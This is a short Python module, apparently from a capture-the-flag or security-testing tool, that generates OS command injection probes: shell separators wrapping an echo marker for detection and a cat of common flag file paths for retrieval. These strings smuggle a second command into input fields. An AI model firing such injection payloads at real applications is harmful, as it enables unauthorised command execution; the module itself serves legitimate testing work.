"""OS command injection probes (read-only).

Detection uses an ``echo`` of a unique marker through common shell separators.
Flag retrieval, only after detection and only under ``--solve``, uses ``cat`` of
conventional flag paths. Nothing here writes, deletes, or spawns a long-running
or networked process.
"""
from __future__ import annotations

# Shell separators. {c} = command to run. Leading/trailing forms cover cases
# where the injected value is placed mid-command.
SEPARATORS = [
    "; {c}",
    "| {c}",
    "|| {c}",
    "&& {c}",
    "$({c})",
    "`{c}`",
    "\n{c}\n",
    "; {c} #",
    "| {c} #",
]

FLAG_PATHS = ("/flag", "/flag.txt", "/app/flag", "/app/flag.txt",
              "flag", "flag.txt", "../flag", "../flag.txt")


def echo_probes(marker: str) -> list[str]:
    """Return separator-wrapped ``echo <marker>`` probes."""
    return [sep.format(c=f"echo {marker}") for sep in SEPARATORS]


def flag_reads() -> list[str]:
    """Return separator-wrapped read-only ``cat`` of flag paths."""
    cmd = "cat " + " ".join(FLAG_PATHS) + " 2>/dev/null"
    return [sep.format(c=cmd) for sep in SEPARATORS]
